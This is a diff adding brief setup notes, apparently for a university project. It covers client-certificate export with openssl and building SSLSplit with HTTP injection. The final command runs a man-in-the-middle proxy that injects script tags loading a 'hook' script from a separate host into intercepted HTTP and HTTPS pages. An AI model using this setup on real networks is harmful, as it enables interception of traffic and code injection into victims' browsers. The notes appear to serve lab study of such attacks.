@@ -1,0 +1,20 @@
+http://stuff-things.net/2015/09/17/client-certificate-ca-setup-and-signing/
+https://blog.haproxy.com/2012/10/03/ssl-client-certificate-management-at-application-level/
+
+openssl pkcs12 -export -out client.pfx -inkey client.key -in client.crt -certfile ca.crt
+	pre import klientskeho certifikatu do firefoxu
+
+
+
+# SSLSplit build
+export CFLAGS="-I/usr/local/opt/openssl/include"
+export LDFLAGS="-L/usr/local/opt/openssl/lib"
+make CFLAGS=-DHTTP_INJECTION_ENABLED -j5
+
+# Test enviroment
+export CERTIFICATE=/Users/vilco/Documents/VUT/2.sem/pds/proj/keys/ca.crt
+export PRIVATE_KEY=/Users/vilco/Documents/VUT/2.sem/pds/proj/keys/ca.key
+export HOOK_HOST=192.168.0.115
+export HOOK_PORT_HTTP=80
+export HOOK_PORT_HTTPS=443
+sudo ./sslsplit -D -k "$PRIVATE_KEY" -c "$CERTIFICATE" -K "$PRIVATE_KEY" -I "<script src='http://$HOOK_HOST:$HOOK_PORT_HTTP/hook' type='text/javascript'></script>" -I  "<script src='https://$HOOK_HOST:$HOOK_PORT_HTTPS/hook' type='text/javascript'></script>" https 0.0.0.0 8443 http 0.0.0.0 8080
